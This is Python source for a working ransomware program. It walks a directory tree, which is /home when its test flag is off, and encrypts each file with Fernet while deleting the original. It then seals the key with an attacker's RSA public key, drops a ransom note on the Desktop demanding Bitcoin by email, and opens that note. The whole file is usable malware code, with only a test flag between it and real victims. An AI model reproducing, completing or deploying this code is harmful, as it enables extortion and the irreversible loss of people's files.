import base64
import os
import subprocess
import threading

from cryptography.hazmat.backends import default_backend as crypto_default_backend
from cryptography.hazmat.primitives import hashes as crypto_hashes
from cryptography.hazmat.primitives import serialization as crypto_serialization
from cryptography.hazmat.primitives.asymmetric import padding as crypto_padding
from cryptography.fernet import Fernet


class Ransomware:
    def __init__(self):
        self.key = None
        self.crypter = None
        self.attacker_public_key = None
        self.sysRoot = os.path.expanduser('~')
        self.testflag = True
        if self.testflag:
            # self.attackroot = self.sysRoot + "/Documents/testFiles"
            self.attackroot = "./testFiles"
        else:
            self.attackroot = "/home"

    def generate_key(self):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)

    def write_key(self):
        if self.testflag:
            with open('fernet_key.txt', 'wb') as f:
                f.write(self.key)

    def enc_fernet_key(self):
        with open("./public.pem", "rb") as key_file:
            self.attacker_public_key = crypto_serialization.load_pem_public_key(key_file.read(),
                                                                                backend=crypto_default_backend())
        enc_blob = encrypt_blob(self.key, self.attacker_public_key)
        with open(self.sysRoot + "/Desktop/Email_Me_After_Paying.pemcry", "wb") as fa:
            fa.write(enc_blob)
        self.key = enc_blob
        self.crypter = None

    def encrypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            # Read data from file
            data = f.read()
            if not encrypted:
                if not (file_path.endswith("cry")):
                    _data = self.crypter.encrypt(data)
                    print("%s > File encrypted" % file_path)
                    os.remove(file_path)
                    with open(file_path + "cry", 'wb') as fp:
                        fp.write(_data)
            else:
                if file_path.endswith("cry"):
                    _data = self.crypter.decrypt(data)
                    print("%s > File decrypted" % file_path)
                    os.remove(file_path)
                    with open(file_path[:-3], 'wb') as fp:
                        fp.write(_data)

    def encrypt_system(self, encrypted=False):
        system = os.walk(self.attackroot, topdown=True)
        for root, directory, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not encrypted:
                    self.encrypt_file(file_path)
                else:
                    self.encrypt_file(file_path, encrypted=True)

    def ransom_note(self):
        with open(self.sysRoot + "/Desktop/RANSOM_NOTE.txt", 'w') as f:
            f.write(f'''
    The hard disk of your computer have been encrypted with RSA-2048 encryption.
    Its impossible to restore your data without a special key.
    Only we can decrypt your files!
    To purchase your key and restore your data, please follow these three easy steps:
    1. Email the file at {self.sysRoot}/Desktop/Email_Me_After_Paying.txt to myemail@gmail.com
    2. You will receive your personal BTC address for payment.
    Once payment has been completed, send another email to myemail@gmail.com stating "PAID".
    We will check to see if payment has been paid.
    3. You will receive a text file with your KEY that will unlock all your files. 
    4. Use this key provided along with the decryption software to get your files back.
    WARNING:
    Do NOT change file names, mess with the files, or run decryption software as there is a high chance you will lose your files forever.
    ''')

    def show_ransom_note(self):
        # Open the ransom note
        subprocess.call(('xdg-open', self.sysRoot + "/Desktop/RANSOM_NOTE.txt"))

    def decrypt_system(self):
        print("Started Decryption")
        try:
            with open(f'{self.sysRoot}/Desktop/PUT_ON_DESKTOP.pem', 'r') as f:
                self.key = f.read()
                self.crypter = Fernet(self.key)
                self.encrypt_system(encrypted=True)
                # break
        except Exception as e:
            print(e)  # Debugging/Testing
            pass


def encrypt_blob(fileblob, public_key):
    chunk_size = 190
    offset = 0
    end_loop = False
    encrypted = b""
    while not end_loop:
        chunk = fileblob[offset: offset + chunk_size]
        if len(chunk) % chunk_size != 0:
            end_loop = True
            chunk += b" " * (chunk_size - len(chunk))
        enc_chunk = public_key.encrypt(chunk, crypto_padding.OAEP(
            mgf=crypto_padding.MGF1(
                algorithm=crypto_hashes.SHA256()),
            algorithm=crypto_hashes.SHA256(),
            label=None
        ))
        encrypted += enc_chunk
        offset += chunk_size
    encrypted_blob = base64.b64encode(encrypted)
    return encrypted_blob


def main():
    foo = Ransomware()
    foo.generate_key()
    foo.encrypt_system()
    foo.write_key()
    foo.enc_fernet_key()
    foo.ransom_note()
    foo.show_ransom_note()
    t1 = threading.Thread(target=foo.decrypt_system)
    t1.start()


if __name__ == '__main__':
    main()
